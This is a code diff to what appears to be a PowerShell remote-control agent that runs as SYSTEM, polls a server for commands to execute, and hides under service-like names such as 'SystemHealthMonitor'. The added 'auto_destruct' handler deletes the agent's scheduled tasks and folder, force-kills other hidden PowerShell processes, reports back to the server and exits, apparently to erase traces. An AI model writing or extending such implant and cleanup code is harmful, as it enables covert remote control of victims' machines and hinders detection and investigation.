@@ -160,6 +160,39 @@ function Execute-AdminPowerShell {
     }
 }
 
+# Self-Destruct Function (runs as SYSTEM for maximum cleanup)
+function Self-Destruct {
+    try {
+        # Delete scheduled tasks
+        schtasks /delete /tn "SystemHealthMonitor" /f 2>$null
+        schtasks /delete /tn "SystemHealthAdmin" /f 2>$null
+        
+        # Kill other agent processes
+        Get-Process -Name powershell -ErrorAction SilentlyContinue | Where-Object {
+            $_.Id -ne $PID -and $_.MainWindowTitle -eq ""
+        } | Stop-Process -Force -ErrorAction SilentlyContinue
+        
+        # Wait a moment for processes to terminate
+        Start-Sleep -Seconds 2
+        
+        # Remove agent folder
+        $agentPath = "C:\ProgramData\SystemHealthService"
+        if (Test-Path $agentPath) {
+            Remove-Item $agentPath -Recurse -Force -ErrorAction SilentlyContinue
+        }
+        
+        return @{
+            data_type = "destruct"
+            data = "Windows agent destroyed successfully (SYSTEM)"
+        }
+    } catch {
+        return @{
+            data_type = "destruct"
+            data = "Destruction failed: $_"
+        }
+    }
+}
+
 # ================================
 # MAIN LOOP
 # ================================
@@ -170,8 +203,8 @@ $retryInterval = if ($config.retry_interval) { $config.retry_interval } else { 1
 
 while ($true) {
     try {
-        # Get pending admin tasks only (cmd_exec_admin, ps_exec_admin)
-        $tasks = Invoke-API -endpoint "tasks?device_id=eq.$deviceId&status=eq.pending&task_type=in.(cmd_exec_admin,ps_exec_admin)&select=id,task_type,task_params"
+        # Get pending admin tasks only (cmd_exec_admin, ps_exec_admin, auto_destruct)
+        $tasks = Invoke-API -endpoint "tasks?device_id=eq.$deviceId&status=eq.pending&task_type=in.(cmd_exec_admin,ps_exec_admin,auto_destruct)&select=id,task_type,task_params"
         
         if ($tasks) {
             # Ensure tasks is an array
@@ -215,6 +248,28 @@ while ($true) {
                                 data = "No command provided"
                             }
                         }
+                    }
+                    
+                    "auto_destruct" {
+                        # Send telemetry first before destroying
+                        $taskResult = Self-Destruct
+                        
+                        # Save results to telemetry before exit
+                        $telemetryData = @{
+                            device_id = $deviceId
+                            data_type = $taskResult.data_type
+                            data = $taskResult.data
+                        }
+                        Invoke-API -endpoint "telemetry" -method "POST" -body $telemetryData | Out-Null
+                        
+                        # Mark task complete
+                        Invoke-API -endpoint "tasks?id=eq.$($task.id)" -method "PATCH" -body @{
+                            status = "complete"
+                            completed_at = (Get-Date -Format "o")
+                        } | Out-Null
+                        
+                        # Exit the script
+                        exit 0
                     }
                 }
                 
